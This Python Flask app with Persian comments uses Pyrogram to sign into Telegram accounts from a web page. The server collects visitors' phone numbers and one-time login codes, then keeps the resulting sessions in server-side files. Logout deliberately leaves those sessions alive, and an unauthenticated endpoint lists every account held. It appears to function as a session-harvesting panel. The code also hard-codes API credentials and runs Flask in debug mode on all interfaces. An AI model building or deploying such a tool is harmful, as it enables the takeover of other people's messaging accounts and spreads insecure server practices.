from flask import Flask, request, jsonify, render_template, make_response
from pyrogram import Client
import asyncio
import os
import json
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'

# اطلاعات API تلگرام (از my.telegram.org)
API_ID = 20032812  # عدد واقعی رو بذار
API_HASH = "04a865813d96a6f3ff4134bae6f3df7e"  # هش واقعی رو بذار

# دیکشنری برای نگهداری کلاینت‌های فعال
active_clients = {}

# دیکشنری برای نگهداری کوکی‌های مرورگر
sessions = {}

# ==================== توابع کمکی ====================

def load_sessions():
    """بارگذاری سشن‌ها از فایل"""
    global sessions
    if os.path.exists('sessions.json'):
        with open('sessions.json', 'r') as f:
            sessions = json.load(f)
    else:
        sessions = {}

def save_sessions():
    """ذخیره سشن‌ها در فایل"""
    with open('sessions.json', 'w') as f:
        json.dump(sessions, f)

# ==================== تابع اصلی ارسال کد (تغییر داده شده) ====================

async def send_code_async(phone, proxy=None):
    try:
        # فقط کلاینت قبلی رو از حافظه حذف کن (بدون قطع کردن)
        if phone in active_clients:
            active_clients.pop(phone, None)
        
        # ساخت کلاینت جدید
        client = Client(
            f"sessions/{phone}",
            api_id=API_ID,
            api_hash=API_HASH,
            proxy=proxy
        )
        
        await client.connect()
        
        # اگر قبلاً احراز هویت شده، مستقیم وارد شو
        if await client.is_user_authorized():
            active_clients[phone] = {
                "client": client,
                "phone_code_hash": None
            }
            return {"status": "authorized", "phone": phone}
        
        # درخواست کد تایید
        sent_code = await client.send_code(phone)
        active_clients[phone] = {
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash
        }
        
        return {"status": "code_sent", "phone": phone}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# ==================== تابع تایید کد ====================

async def sign_in_async(phone, code):
    try:
        if phone not in active_clients:
            return {"status": "error", "message": "شماره پیدا نشد"}
        
        client = active_clients[phone]["client"]
        phone_code_hash = active_clients[phone]["phone_code_hash"]
        
        # تلاش برای ورود با کد
        await client.sign_in(phone, code, phone_code_hash)
        
        # ذخیره سشن در کوکی
        sessions[phone] = {
            "logged_in": True,
            "time": datetime.now().isoformat()
        }
        save_sessions()
        
        return {"status": "success", "phone": phone}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# ==================== مسیرهای وب ====================

@app.route('/')
def index():
    """صفحه اصلی"""
    phone = request.cookies.get('phone')
    logged_in = request.cookies.get('logged_in')
    
    if phone and logged_in == 'true' and phone in sessions:
        return render_template('dashboard.html', phone=phone)
    return render_template('login.html')

@app.route('/send_code', methods=['POST'])
def send_code():
    """ارسال کد تایید"""
    data = request.get_json()
    phone = data.get('phone')
    proxy = data.get('proxy')  # اختیاری
    
    if not phone:
        return jsonify({"status": "error", "message": "شماره تلفن الزامی است"})
    
    # اجرای تابع async
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(send_code_async(phone, proxy))
    loop.close()
    
    return jsonify(result)

@app.route('/verify_code', methods=['POST'])
def verify_code():
    """تایید کد"""
    data = request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    
    if not phone or not code:
        return jsonify({"status": "error", "message": "شماره و کد الزامی است"})
    
    # اجرای تابع async
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(sign_in_async(phone, code))
    loop.close()
    
    if result["status"] == "success":
        resp = make_response(jsonify(result))
        resp.set_cookie('phone', phone, max_age=60*60*24*30)  # 30 روز
        resp.set_cookie('logged_in', 'true', max_age=60*60*24*30)
        return resp
    
    return jsonify(result)

@app.route('/logout', methods=['POST'])
def logout():
    """خروج از حساب (بدون قطع کردن کلاینت)"""
    try:
        data = request.get_json()
        phone = data.get('phone')
        
        if not phone:
            return jsonify({"status": "error", "message": "شماره تلفن ارسال نشده"})
        
        # فقط کلاینت رو از حافظه حذف کن (بدون قطع کردن)
        if phone in active_clients:
            active_clients.pop(phone, None)
        
        # حذف از سشن‌ها
        if phone in sessions:
            sessions.pop(phone, None)
            save_sessions()
        
        # پاک کردن کوکی مرورگر
        resp = make_response(jsonify({"status": "success", "message": "خروج با موفقیت انجام شد"}))
        resp.set_cookie('phone', '', expires=0)
        resp.set_cookie('logged_in', '', expires=0)
        
        return resp
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/get_clients', methods=['GET'])
def get_clients():
    """دریافت لیست کلاینت‌های فعال"""
    clients_list = []
    for phone, data in active_clients.items():
        clients_list.append({
            "phone": phone,
            "connected": data["client"].is_connected if hasattr(data["client"], "is_connected") else False
        })
    return jsonify({"clients": clients_list, "count": len(clients_list)})

@app.route('/status')
def status():
    """وضعیت سیستم"""
    return jsonify({
        "active_clients": len(active_clients),
        "sessions": len(sessions),
        "status": "running"
    })

# ==================== اجرای برنامه ====================

if __name__ == '__main__':
    # ایجاد پوشه سشن‌ها
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    
    # بارگذاری سشن‌ها
    load_sessions()
    
    # اجرای سرور
    app.run(host='0.0.0.0', port=5000, debug=True)
